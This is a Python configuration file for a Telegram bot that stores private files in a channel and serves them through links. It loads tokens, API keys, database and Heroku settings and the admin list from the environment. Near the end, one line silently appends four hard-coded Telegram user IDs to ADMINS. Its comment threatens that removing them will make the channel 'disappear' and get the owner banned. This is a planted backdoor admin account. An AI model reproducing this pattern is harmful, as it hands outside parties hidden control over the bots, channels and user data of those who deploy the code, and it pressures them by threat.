# (©)Codexbotz
# Recoded by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token from @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

# Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

# Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

# Database Channel ID
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

# Owner's Name
OWNER = os.environ.get("OWNER", "")

# Protect Content
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))

# Heroku Credentials for updater.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Custom Repo for updater.
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")

# Database
DB_URI = os.environ.get("DATABASE_URL", "")

# Channel or Group ID for Mandatory Subscription
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Start message
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>I can store private files in a Specific Channel and other users can access them through a special link.</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
except ValueError:
    raise Exception("Your Admins list does not contain valid Telegram User IDs.")

# Force Subscribe message
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {first}\n\nYou must join my Channel/Group to access the files I share\n\nPlease Join the Channel & Group First</b>",
)

# Set your Custom Text here, Keep (None) to Disable Custom Text
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Set True if you want to Disable the Share button on your Channel Posts
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))

# Do not Delete, or you'll face ERROR later, DELETE IDs below = ACCEPT CONSEQUENCES
# Spoiler CONSEQUENCES: Most likely your channel will suddenly disappear & I'll ban the owner 🤪
ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
